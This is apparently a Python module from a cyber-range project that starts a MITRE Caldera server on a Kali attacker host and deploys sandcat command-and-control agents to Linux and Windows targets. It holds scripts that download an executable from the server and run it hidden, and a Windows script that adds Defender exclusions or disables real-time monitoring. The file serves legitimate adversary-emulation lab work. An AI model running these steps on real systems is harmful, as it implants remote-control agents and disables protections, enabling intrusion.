"""Optional Caldera runtime setup plans.

The Kali AMI bake owns installing Caldera. These plans only start the baked
server and deploy sandcat payloads produced by that server during range setup.
"""

from __future__ import annotations

from typing import Any, ClassVar

from .base import SetupStep

_DEFAULT_CALDERA_WORKING_DIRECTORY = "/opt/caldera"
_DEFAULT_CALDERA_START_COMMAND = "/usr/local/bin/start-caldera"
_DEFAULT_CALLBACK_PORT = 8888
_DEFAULT_WINDOWS_DEFENDER_MODE = "path_exclusion"

START_CALDERA_SERVER_SCRIPT = """#!/bin/bash
set -euo pipefail

caldera_dir="{{ caldera_working_directory }}"
start_command="{{ caldera_start_command }}"
callback_port="{{ callback_port }}"
config_path="${caldera_dir}/conf/default.yml"

echo "Starting baked Caldera server on port ${callback_port}..."
# Baked defaults: /opt/caldera and /usr/local/bin/start-caldera.

if [ ! -d "$caldera_dir" ]; then
    echo "ERROR: Caldera directory is missing at $caldera_dir"
    exit 1
fi

if [ ! -x "$start_command" ]; then
    echo "ERROR: Caldera start command is missing or not executable at $start_command"
    exit 1
fi

if [ ! -f "$config_path" ]; then
    echo "ERROR: Caldera default configuration is missing at $config_path"
    exit 1
fi

sed -i -E "s#^(host:).*#\\1 0.0.0.0#" "$config_path"
sed -i -E "s#^(port:).*#\\1 ${callback_port}#" "$config_path"
sed -i -E "s#^(app.contact.http:).*#\\1 http://0.0.0.0:${callback_port}#" "$config_path"
sed -i -E "s#^(app.frontend.api_base_url:).*#\\1 http://0.0.0.0:${callback_port}#" "$config_path"

if command -v systemctl >/dev/null 2>&1 && [ -d /run/systemd/system ]; then
    cat > /etc/systemd/system/caldera.service <<SERVICE
[Unit]
Description=MITRE Caldera
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
WorkingDirectory=$caldera_dir
ExecStart=$start_command
Restart=on-failure
RestartSec=10

[Install]
WantedBy=multi-user.target
SERVICE
    systemctl daemon-reload
    systemctl enable --now caldera.service
    systemctl restart caldera.service
else
    if ! curl -fsS "http://127.0.0.1:${callback_port}/" >/dev/null 2>&1; then
        nohup "$start_command" >/var/log/caldera.log 2>&1 &
    fi
fi

for attempt in $(seq 1 24); do
    if curl -fsS "http://127.0.0.1:${callback_port}/" >/dev/null 2>&1; then
        echo "Caldera server is reachable"
        exit 0
    fi
    sleep 5
done

echo "ERROR: Caldera did not become reachable on 127.0.0.1:${callback_port}"
exit 1
"""

VERIFY_CALDERA_SERVER_SCRIPT = """#!/bin/bash
set -euo pipefail

curl -fsS "http://127.0.0.1:{{ callback_port }}/" >/dev/null
echo "Caldera server verified"
"""

DOWNLOAD_LINUX_SANDCAT_SCRIPT = """#!/bin/bash
set -euo pipefail

server_url="{{ caldera_server_url }}"
payload_path="/tmp/sandcat.go-linux"

echo "Downloading Linux sandcat payload..."
curl -sSfL -X POST \
    -H "file:sandcat.go" \
    -H "platform:linux" \
    -o "$payload_path" \
    "{{ caldera_server_url }}/file/download"
chmod 0755 "$payload_path"

if [ ! -s "$payload_path" ]; then
    echo "ERROR: sandcat payload is missing or empty at $payload_path"
    exit 1
fi

echo "Linux sandcat payload ready at $payload_path"
"""

START_LINUX_SANDCAT_SCRIPT = """#!/bin/bash
set -euo pipefail

server_url="{{ caldera_server_url }}"
payload_path="/tmp/sandcat.go-linux"
log_path="/tmp/sandcat.log"

if [ ! -x "$payload_path" ]; then
    echo "ERROR: sandcat payload is not executable at $payload_path"
    exit 1
fi

if pgrep -af "$payload_path" | grep -F -- "-server ${server_url}" >/dev/null 2>&1; then
    echo "Linux sandcat is already running"
    exit 0
fi

nohup "$payload_path" -server "$server_url" -group red -v >"$log_path" 2>&1 &
sleep 3

if pgrep -af "$payload_path" | grep -F -- "-server ${server_url}" >/dev/null 2>&1; then
    echo "Linux sandcat started"
    exit 0
fi

echo "ERROR: Linux sandcat did not start"
exit 1
"""

VERIFY_LINUX_SANDCAT_SCRIPT = """#!/bin/bash
set -euo pipefail

server_url="{{ caldera_server_url }}"
payload_path="/tmp/sandcat.go-linux"

pgrep -af "$payload_path" | grep -F -- "-server ${server_url}" >/dev/null
echo "Linux sandcat process verified"
"""

DOWNLOAD_WINDOWS_SANDCAT_SCRIPT = r"""
$ErrorActionPreference = "Stop"

$serverUrl = "{{ caldera_server_url }}"
$payloadPath = "C:\Users\Public\sandcat.exe"
$defenderMode = "{{ windows_defender_mode }}"

Write-Host "Preparing Windows Defender policy for sandcat..."
$addPreference = Get-Command Add-MpPreference -ErrorAction SilentlyContinue
$setPreference = Get-Command Set-MpPreference -ErrorAction SilentlyContinue

if ($defenderMode -eq "disable_realtime") {
    if (-not $setPreference) {
        throw "Set-MpPreference is unavailable; cannot disable real-time monitoring"
    }
    Set-MpPreference -DisableRealtimeMonitoring $true
    Write-Host "Windows Defender real-time monitoring disabled for Caldera setup"
} elseif ($addPreference) {
    Add-MpPreference -ExclusionPath $payloadPath
    Add-MpPreference -ExclusionProcess $payloadPath
    Write-Host "Windows Defender path/process exclusion applied for sandcat"
} else {
    Write-Host "Windows Defender preference cmdlets unavailable; continuing without exclusion"
}

Write-Host "Downloading Windows sandcat payload..."
$webClient = New-Object System.Net.WebClient
$webClient.Headers.Add("file", "sandcat.go")
$webClient.Headers.Add("platform", "windows")
$webClient.DownloadFile("{{ caldera_server_url }}/file/download", $payloadPath)

if (-not (Test-Path $payloadPath)) {
    throw "sandcat payload was not written to $payloadPath"
}
if ((Get-Item $payloadPath).Length -le 0) {
    throw "sandcat payload at $payloadPath is empty"
}

Write-Host "Windows sandcat payload ready at $payloadPath"
"""

START_WINDOWS_SANDCAT_SCRIPT = r"""
$ErrorActionPreference = "Stop"

$serverUrl = "{{ caldera_server_url }}"
$payloadPath = "C:\Users\Public\sandcat.exe"

if (-not (Test-Path $payloadPath)) {
    throw "sandcat payload missing at $payloadPath"
}

$running = Get-CimInstance Win32_Process | Where-Object {
    $_.ExecutablePath -eq $payloadPath -or
    ($_.CommandLine -like "*sandcat.exe*" -and $_.CommandLine -like "*-server $serverUrl*")
}

if ($running) {
    Write-Host "Windows sandcat is already running"
    exit 0
}

Start-Process -FilePath $payloadPath -ArgumentList @("-server", $serverUrl, "-group", "red", "-v") -WindowStyle Hidden
Start-Sleep -Seconds 3

$running = Get-CimInstance Win32_Process | Where-Object {
    $_.ExecutablePath -eq $payloadPath -or
    ($_.CommandLine -like "*sandcat.exe*" -and $_.CommandLine -like "*-server $serverUrl*")
}

if (-not $running) {
    throw "Windows sandcat did not start"
}

Write-Host "Windows sandcat started"
"""

VERIFY_WINDOWS_SANDCAT_SCRIPT = r"""
$ErrorActionPreference = "Stop"

$serverUrl = "{{ caldera_server_url }}"
$payloadPath = "C:\Users\Public\sandcat.exe"

$running = Get-CimInstance Win32_Process | Where-Object {
    $_.ExecutablePath -eq $payloadPath -or
    ($_.CommandLine -like "*sandcat.exe*" -and $_.CommandLine -like "*-server $serverUrl*")
}

if (-not $running) {
    throw "Windows sandcat process not found"
}

Write-Host "Windows sandcat process verified"
"""


class CalderaServerPlan:
    """Start and verify the baked Caldera server on the Kali attacker."""

    steps: ClassVar[list[SetupStep]] = [
        SetupStep(
            name="start_caldera_server",
            script=START_CALDERA_SERVER_SCRIPT,
            timeout_seconds=180,
        ),
    ]

    verify_step: ClassVar[SetupStep] = SetupStep(
        name="verify_caldera_server",
        script=VERIFY_CALDERA_SERVER_SCRIPT,
        timeout_seconds=60,
        is_verification=True,
    )

    def get_context(self, config: dict[str, Any]) -> dict[str, Any]:
        """Return defaulted server start context."""
        return {
            "callback_port": config.get("callback_port", _DEFAULT_CALLBACK_PORT),
            "caldera_working_directory": config.get(
                "server_working_directory",
                _DEFAULT_CALDERA_WORKING_DIRECTORY,
            ),
            "caldera_start_command": config.get("server_start_command", _DEFAULT_CALDERA_START_COMMAND),
        }


class LinuxSandcatAgentPlan:
    """Download, start, and verify a Linux sandcat agent."""

    steps: ClassVar[list[SetupStep]] = [
        SetupStep(
            name="download_linux_sandcat",
            script=DOWNLOAD_LINUX_SANDCAT_SCRIPT,
            timeout_seconds=120,
        ),
        SetupStep(
            name="start_linux_sandcat",
            script=START_LINUX_SANDCAT_SCRIPT,
            timeout_seconds=60,
        ),
    ]

    verify_step: ClassVar[SetupStep] = SetupStep(
        name="verify_linux_sandcat",
        script=VERIFY_LINUX_SANDCAT_SCRIPT,
        timeout_seconds=30,
        is_verification=True,
    )

    def get_context(self, config: dict[str, Any]) -> dict[str, Any]:
        """Return agent callback context."""
        server_url = config.get("caldera_server_url")
        if not server_url:
            raise ValueError("config missing required key 'caldera_server_url' for Linux sandcat setup")
        return {"caldera_server_url": server_url}


class WindowsSandcatAgentPlan:
    """Download, start, and verify a Windows sandcat agent."""

    steps: ClassVar[list[SetupStep]] = [
        SetupStep(
            name="download_windows_sandcat",
            script=DOWNLOAD_WINDOWS_SANDCAT_SCRIPT,
            timeout_seconds=180,
        ),
        SetupStep(
            name="start_windows_sandcat",
            script=START_WINDOWS_SANDCAT_SCRIPT,
            timeout_seconds=60,
        ),
    ]

    verify_step: ClassVar[SetupStep] = SetupStep(
        name="verify_windows_sandcat",
        script=VERIFY_WINDOWS_SANDCAT_SCRIPT,
        timeout_seconds=30,
        is_verification=True,
    )

    def get_context(self, config: dict[str, Any]) -> dict[str, Any]:
        """Return agent callback and Windows Defender policy context."""
        server_url = config.get("caldera_server_url")
        if not server_url:
            raise ValueError("config missing required key 'caldera_server_url' for Windows sandcat setup")
        return {
            "caldera_server_url": server_url,
            "windows_defender_mode": config.get("windows_defender_mode", _DEFAULT_WINDOWS_DEFENDER_MODE),
        }
